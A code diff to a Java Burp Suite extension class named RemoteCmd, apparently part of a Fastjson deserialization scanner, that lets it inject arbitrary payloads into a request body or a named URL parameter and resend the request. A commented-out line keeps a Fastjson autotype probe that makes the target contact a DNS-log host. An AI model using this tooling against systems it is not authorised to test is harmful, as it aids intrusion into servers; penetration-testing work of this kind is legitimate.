@@ -1,10 +1,8 @@
 package burp.extension;
 
-import burp.IBurpExtenderCallbacks;
-import burp.IExtensionHelpers;
-import burp.IHttpRequestResponse;
-import burp.IRequestInfo;
+import burp.*;
 
+import java.net.URLEncoder;
 import java.util.Arrays;
 import java.util.List;
 
@@ -29,16 +27,36 @@ public class RemoteCmd {
         this.payloads = payloads;
         this.iHttpRequestResponse = iHttpRequestResponse;
     }
-    public IHttpRequestResponse run(){
-        payloads = Arrays.asList("{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}","c");
+
+    // 添加payload
+    public IHttpRequestResponse run(String payload){
+//        payloads = Arrays.asList("{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}","c");
         byte[] request = iHttpRequestResponse.getRequest();
         IRequestInfo requestInfo = helpers.analyzeRequest(request);
         List<String> headers = requestInfo.getHeaders();
-        byte[] bytes = helpers.buildHttpMessage(headers, helpers.stringToBytes(payloads.get(0)));
+        byte[] bytes = helpers.buildHttpMessage(headers, helpers.stringToBytes(payload));
         return callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(), bytes);
-
     }
 
 
-
+    public IHttpRequestResponse run(String payloads,String key) {
+//        payloads = Arrays.asList("{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}","c");
+        byte[] bytes;
+        byte[] request = iHttpRequestResponse.getRequest();
+        IRequestInfo requestInfo = helpers.analyzeRequest(request);
+        List<IParameter> parameters = requestInfo.getParameters();
+        try {
+            // 寻找json param位置
+            for (IParameter parameter:parameters){
+                if (key.equals(parameter.getName())){
+                    IParameter parameter1 = helpers.buildParameter(key, URLEncoder.encode(payloads), IParameter.PARAM_URL);
+                    bytes = helpers.updateParameter(request, parameter1);
+                    return callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(),bytes);
+                }
+            }
+        }catch (Exception e){
+            throw e;
+        }
+        return iHttpRequestResponse;
+    }
 }
